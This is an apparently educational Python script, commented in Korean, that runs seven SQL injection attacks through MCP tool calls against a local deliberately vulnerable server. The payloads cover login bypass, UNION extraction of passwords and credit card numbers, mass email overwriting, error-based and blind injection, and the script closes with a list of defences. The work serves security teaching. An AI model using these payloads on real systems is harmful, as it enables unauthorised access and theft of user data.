#!/usr/bin/env python3
"""
===========================================
SQL Injection 공격 시뮬레이션
===========================================

강의 목적:
이 스크립트는 교육 목적으로 다양한 SQL Injection 공격 기법을 시연합니다.
실제 환경에서 무단으로 사용하면 법적 책임을 질 수 있습니다!

학습 포인트:
1. 다양한 SQL Injection 공격 기법 이해
2. 각 공격이 성공하는 원리 파악
3. 공격의 위험성과 피해 범위 인식
4. 방어 필요성 체감

주의사항:
- 이 코드는 교육용입니다
- 실제 시스템에 대한 무단 공격은 범죄입니다
- 반드시 허가된 환경에서만 테스트하세요
"""

# ===========================================
# 필요한 라이브러리 임포트
# ===========================================

import asyncio  # 비동기 프로그래밍
import json     # JSON 데이터 처리 (현재 사용되지 않지만 확장 가능성)
from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client


# ===========================================
# 공격 시뮬레이션 메인 함수
# ===========================================

async def run_attack_simulation():
    """
    SQL Injection 공격 시뮬레이션 실행

    총 7가지 공격 기법을 순차적으로 시연합니다:
    1. 인증 우회 (Authentication Bypass)
    2. UNION 기반 데이터 추출
    3. 숫자 필드 SQL Injection
    4. 데이터 조작 (UPDATE Injection)
    5. 에러 기반 정보 수집
    6. SQL 주석을 이용한 우회
    7. Blind SQL Injection

    각 공격은 실제로 실행되며, 결과를 화면에 출력합니다.
    """

    # 시뮬레이션 시작 헤더 출력
    print("=" * 70)
    print("⚠️  SQL INJECTION 공격 시뮬레이션")
    print("=" * 70)
    print("⚠️  경고: 이 스크립트는 교육 목적으로만 사용하세요!")
    print("=" * 70)

    # ===========================================
    # 서버 연결 설정
    # ===========================================
    # 취약한 서버(vulnerable_server.py)를 실행하고 연결
    import os
    script_dir = os.path.dirname(os.path.abspath(__file__))

    server_params = StdioServerParameters(
        command="python3",
        args=[os.path.join(script_dir, "vulnerable_server.py")],
        env=None
    )

    # ===========================================
    # MCP 클라이언트 세션 시작
    # ===========================================
    async with stdio_client(server_params) as (read, write):
        async with ClientSession(read, write) as session:
            await session.initialize()

            # ===========================================
            # 공격 1: 인증 우회 (Authentication Bypass)
            # ===========================================
            print("\n🎯 공격 1: 인증 우회 (Authentication Bypass)")
            print("-" * 70)
            print("📝 공격 기법: ' OR '1'='1")
            print("💡 원리: SQL 쿼리의 WHERE 조건을 항상 참으로 만듦")
            print()

            # 공격 원리 설명:
            # 정상 쿼리: SELECT * FROM users WHERE username='admin' AND password='xxx'
            # 공격 쿼리: SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'
            #
            # 'admin' OR '1'='1'에서 OR 연산자 때문에
            # '1'='1'이 항상 참이므로 전체 WHERE 조건이 참이 됩니다
            # 결과: 비밀번호 검증 없이 로그인 성공
            result = await session.call_tool("login", arguments={
                "username": "admin' OR '1'='1",
                "password": "anything"
            })
            print(f"🔥 공격 결과:\n{result.content[0].text}")

            # ===========================================
            # 공격 2: UNION 기반 데이터 추출
            # ===========================================
            print("\n🎯 공격 2: UNION SELECT - 전체 데이터 추출")
            print("-" * 70)
            print("📝 공격 기법: UNION SELECT")
            print("💡 원리: 추가 SELECT 문으로 다른 데이터 조회")
            print()

            # 공격 원리 설명:
            # 정상 쿼리: SELECT id, username, email, role FROM users WHERE username LIKE '%bob%'
            # 공격 쿼리: SELECT id, username, email, role FROM users WHERE username LIKE '%'
            #            UNION SELECT id, username, password, credit_card FROM users--%'
            #
            # UNION: 두 개의 SELECT 결과를 합침
            # --: SQL 주석으로 뒤의 내용 무시
            #
            # 결과: 원래 조회하면 안 되는 password와 credit_card까지 노출됨
            result = await session.call_tool("search_user", arguments={
                "username": "' UNION SELECT id, username, password, credit_card FROM users--"
            })
            print(f"🔥 공격 결과:\n{result.content[0].text}")

            # ===========================================
            # 공격 3: 숫자 필드 SQL Injection
            # ===========================================
            print("\n🎯 공격 3: 숫자 필드를 통한 데이터 추출")
            print("-" * 70)
            print("📝 공격 기법: UNION SELECT with numeric field")
            print("💡 원리: 숫자 필드도 SQL Injection에 취약할 수 있음")
            print()

            # 공격 원리 설명:
            # 정상 쿼리: SELECT id, username, email, role FROM users WHERE id=1
            # 공격 쿼리: SELECT id, username, email, role FROM users WHERE id=1
            #            UNION SELECT id, username, password, credit_card FROM users
            #
            # 중요 포인트:
            # - 숫자 필드라고 안전한 것이 아닙니다
            # - 따옴표 없이도 UNION, OR 같은 SQL 키워드 삽입 가능
            # - 문자열 타입으로 받아서 숫자로 변환하지 않으면 취약
            #
            # 결과: 모든 사용자의 비밀번호와 신용카드 정보 유출
            result = await session.call_tool("get_user_info", arguments={
                "user_id": "1 UNION SELECT id, username, password, credit_card FROM users"
            })
            print(f"🔥 공격 결과:\n{result.content[0].text}")

            # ===========================================
            # 공격 4: 데이터 조작 (UPDATE Injection)
            # ===========================================
            print("\n🎯 공격 4: 데이터 조작 공격")
            print("-" * 70)
            print("📝 공격 기법: SQL Injection in UPDATE")
            print("💡 원리: UPDATE 문에서 추가 조건 삽입")
            print()

            # 공격 원리 설명:
            # 정상 쿼리: UPDATE users SET email='new@email.com' WHERE username='alice'
            # 공격 쿼리: UPDATE users SET email='hacked@evil.com' WHERE '1'='1' WHERE username='alice'
            #
            # WHERE '1'='1'을 삽입하여:
            # - 원래 WHERE 조건을 무력화
            # - 모든 행에 대해 UPDATE 실행
            #
            # 결과: alice만 변경하려 했지만 모든 사용자의 이메일이 변경됨
            # 더 위험한 예: role='admin' 삽입하여 권한 상승 가능
            result = await session.call_tool("update_email", arguments={
                "username": "alice",
                "new_email": "hacked@evil.com' WHERE '1'='1"
            })
            print(f"🔥 공격 결과:\n{result.content[0].text}")

            # ===========================================
            # 공격 결과 확인
            # ===========================================
            # 위의 UPDATE 공격이 실제로 모든 사용자에게 적용되었는지 확인
            print("\n📊 공격 후 데이터베이스 상태 확인")
            print("-" * 70)
            result = await session.call_tool("search_user", arguments={
                "username": ""  # 빈 문자열로 모든 사용자 검색
            })
            print(f"현재 사용자 목록:\n{result.content[0].text}")

            # ===========================================
            # 공격 5: 정보 수집 (Error-based SQL Injection)
            # ===========================================
            print("\n🎯 공격 5: 에러 기반 정보 수집")
            print("-" * 70)
            print("📝 공격 기법: Error-based SQL Injection")
            print("💡 원리: 의도적으로 SQL 에러를 발생시켜 DB 구조 파악")
            print()

            # 공격 원리 설명:
            # 잘못된 SQL 문법을 입력하여 데이터베이스 에러 발생
            #
            # 입력: username="admin'"
            # 결과 쿼리: SELECT * FROM users WHERE username='admin'' AND password='test'
            #                                                      ↑ 따옴표가 닫히지 않음
            #
            # 에러 메시지에서 얻을 수 있는 정보:
            # 1. 데이터베이스 종류 (MySQL, PostgreSQL, SQLite 등)
            # 2. 테이블명과 컬럼명
            # 3. SQL 쿼리 구조
            # 4. 파일 경로나 버전 정보
            #
            # 이 정보를 바탕으로 더 정교한 공격 가능
            result = await session.call_tool("login", arguments={
                "username": "admin'",
                "password": "test"
            })
            print(f"🔥 공격 결과:\n{result.content[0].text}")

            # ===========================================
            # 공격 6: 주석을 이용한 우회
            # ===========================================
            print("\n🎯 공격 6: SQL 주석을 이용한 우회")
            print("-" * 70)
            print("📝 공격 기법: SQL Comment (--)")
            print("💡 원리: -- 이후의 모든 내용을 주석 처리")
            print()

            # 공격 원리 설명:
            # 정상 쿼리: SELECT * FROM users WHERE username='admin' AND password='xxx'
            # 공격 쿼리: SELECT * FROM users WHERE username='admin'--' AND password='ignored'
            #                                                      ↑ 여기서부터 주석
            #
            # -- (SQL 주석):
            # - 해당 라인의 나머지 부분을 모두 무시
            # - 비밀번호 검증 부분이 통째로 주석 처리됨
            #
            # 결과 쿼리 실행: SELECT * FROM users WHERE username='admin'
            # 비밀번호 없이 admin 계정 정보를 조회할 수 있음
            #
            # 다른 주석 문법:
            # - /* */ : 다중 라인 주석 (MySQL, PostgreSQL)
            # - # : 라인 주석 (MySQL)
            result = await session.call_tool("login", arguments={
                "username": "admin'--",
                "password": "ignored"
            })
            print(f"🔥 공격 결과:\n{result.content[0].text}")

            # ===========================================
            # 공격 7: Blind SQL Injection 시뮬레이션
            # ===========================================
            print("\n🎯 공격 7: Blind SQL Injection (시간 기반)")
            print("-" * 70)
            print("📝 공격 기법: Time-based Blind SQL Injection")
            print("💡 원리: 응답 시간 차이로 정보 추출 (SQLite는 SLEEP 미지원)")
            print()

            # Blind SQL Injection 설명:
            #
            # 일반 SQL Injection과의 차이:
            # - 일반: 쿼리 결과가 화면에 직접 표시됨
            # - Blind: 결과가 표시되지 않지만 참/거짓 판단은 가능
            #
            # 시간 기반 Blind SQL Injection:
            # - 조건이 참이면 지연 발생 (SLEEP, WAITFOR 등)
            # - 조건이 거짓이면 즉시 응답
            # - 응답 시간을 측정하여 정보를 한 비트씩 추출
            #
            # 예시 (MySQL):
            # ' OR IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100, SLEEP(5), 0)--
            #
            # 이 공격으로 얻을 수 있는 정보:
            # - 데이터베이스 버전
            # - 테이블명, 컬럼명
            # - 실제 데이터 값 (매우 느리지만 가능)
            #
            # SQLite 한계:
            # - SLEEP 함수가 없어 시간 지연 구현이 어려움
            # - 대신 Boolean 기반 Blind Injection 사용
            result = await session.call_tool("search_user", arguments={
                "username": "' OR (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)='1"
            })
            print(f"🔥 공격 결과:\n{result.content[0].text}")

    # ===========================================
    # 공격 시뮬레이션 결과 요약
    # ===========================================
    print("\n" + "=" * 70)
    print("⚠️  공격 시뮬레이션 완료")
    print("=" * 70)
    print()
    print("📋 공격 성공 요약:")
    print("  ✓ 인증 우회 성공 - 비밀번호 없이 로그인 가능")
    print("  ✓ 전체 데이터 추출 성공 - 사용자 비밀번호 및 신용카드 정보 탈취")
    print("  ✓ 데이터 조작 성공 - 모든 사용자의 이메일 변경")
    print("  ✓ DB 구조 정보 수집 성공")
    print()
    print("🛡️  방어 방법:")
    print("  1. Prepared Statements 사용")
    print("  2. 파라미터화된 쿼리 사용")
    print("  3. 입력값 검증 및 필터링")
    print("  4. 최소 권한 원칙 적용")
    print("  5. 에러 메시지 최소화")
    print("=" * 70)


# ===========================================
# 프로그램 진입점
# ===========================================

if __name__ == "__main__":
    """
    스크립트 직접 실행 시 공격 시뮬레이션 시작

    실행 방법:
    python3 attack_simulation.py

    또는 Docker 환경:
    make shell python3 Part2_SQLInjection/NoSQLDefense/attack_simulation.py

    실행 전 확인사항:
    - vulnerable_server.py와 같은 디렉토리에 있어야 함
    - MCP 라이브러리 설치 필요 (pip install anthropic mcp)
    - Python 3.7 이상 필요 (async/await 지원)
    """
    asyncio.run(run_attack_simulation())


# ===========================================
# 학습 정리
# ===========================================
"""
이 파일에서 배운 내용:

1. SQL Injection 공격 기법 7가지
   - 인증 우회: OR 연산자 활용
   - UNION 공격: 추가 SELECT 문 삽입
   - 숫자 필드 공격: 따옴표 없이도 공격 가능
   - UPDATE 공격: 데이터 변조
   - Error-based: 에러 메시지로 정보 수집
   - 주석 우회: -- 로 쿼리 일부 무효화
   - Blind 공격: 결과 없이도 정보 추출

2. 공격의 위험성
   - 인증 완전 우회 가능
   - 민감한 정보(비밀번호, 신용카드) 탈취
   - 대량 데이터 변조 가능
   - 권한 상승 가능

3. 공격 성공 조건
   - 사용자 입력을 SQL 쿼리에 직접 삽입
   - 입력값 검증 부재
   - 에러 메시지 과도한 노출

4. 방어의 중요성
   - 단 하나의 취약점으로도 전체 시스템 위협
   - 모든 입력은 잠재적 공격 벡터
   - 다층 방어 전략 필요

다음 학습:
- secure_server.py: 안전한 구현 방법
- secure_attack_simulation.py: 방어 메커니즘 검증
- 실제 프로젝트에 보안 원칙 적용
"""
